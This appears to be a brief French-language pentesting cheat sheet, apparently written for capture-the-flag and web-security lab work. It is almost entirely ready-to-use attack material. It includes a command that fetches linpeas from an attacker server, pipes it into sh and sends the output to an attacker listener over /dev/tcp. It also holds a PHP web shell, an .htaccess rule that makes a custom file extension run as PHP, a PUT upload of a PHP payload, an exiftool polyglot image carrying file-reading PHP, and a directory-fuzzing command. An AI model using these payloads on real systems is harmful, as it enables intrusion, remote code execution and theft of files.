Exécuter un programme sur un reverse shell
```bash
attacker1$ python3 -m http.server  <- se lance sur le port 8000
attacker2$ nc -nlvp 9000 | tee linpeas-out.txt 

victim$ curl http://attacker_ip:8000/linpeas.sh | sh > /dev/tcp/attacker_ip/9000
```


# WEB
`php shell`
```php
<?php system($_GET['cmd']);
echo shell_exec("cat ../../../../../../home/carlos/secret");
?>
```

`.htaccess`
```ruby
AddType application/x-httpd-php .l33t
```

`fuzzing`
```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://analytical.htb/FUZZ -ic -mc all -fs 162
```

`upload with PUT`
```bash
PUT /images/exploit.php HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-httpd-php Content-Length: 49 <?php echo file_get_contents('/path/to/file'); ?>
```

`polyglot file`
```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cars-1-a-370x500.jpg -o polyglot.php
```